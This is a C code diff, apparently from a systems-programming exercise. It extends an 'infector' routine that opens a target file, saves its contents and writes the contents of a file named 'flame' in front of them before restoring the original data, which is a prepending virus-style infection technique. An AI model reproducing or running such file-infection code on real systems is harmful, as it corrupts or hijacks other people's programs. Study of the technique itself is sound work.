@@ -121,14 +121,21 @@ void infection(){
 }
 
 void infector(char* fileName){
+  /* Standard output */
   system_call(SYS_WRITE, STDOUT, "Infecting: ", 11);
   system_call(SYS_WRITE, STDOUT, fileName, strlen(fileName));
   system_call(SYS_WRITE, STDOUT, "\n", 1);
-  int fd, flameFile; /* file descriptors */
-  fd = system_call(SYS_OPEN, fileName, O_RDRW, 0777);
-  system_call(SYS_LSEEK, fd, 0, SEEK_SET);     /* START OF FILE */
-  flameFile = system_call(SYS_OPEN, "flame", O_RDONLY, 0777);
 
+  char oldFileBuffer[BUFFER_SIZE];
+  int actualSize;
+
+  int fd, flameFile; /* file descriptors */
+  fd = system_call(SYS_OPEN, fileName, O_RDRW, 0777); /*target file */
+  flameFile = system_call(SYS_OPEN, "flame", O_RDONLY, 0777); /*flame File */
+  actualSize = system_call(SYS_READ, fd, &oldFileBuffer, BUFFER_SIZE); /*save old file content*/
+  system_call(SYS_LSEEK, fd, 0, SEEK_SET);     /* START OF FILE */
+  
+  /*now write the new content to the target file */
   int read;
   int write;
   char c;
@@ -141,9 +148,12 @@ void infector(char* fileName){
        system_call(SYS_WRITE, STDOUT, "\n", 1);
        break;
     }
-    count ++;
+    count ++;  /*for debugging, unusued */
   }
-  system_call(SYS_WRITE, STDOUT, "Infected!\n", 10);
+
+  system_call(SYS_WRITE, fd, &oldFileBuffer, actualSize); /*write back old content*/
+
+  system_call(SYS_WRITE, STDOUT, "Infected!\n", 10);  /* Standard output */
 }
 
 
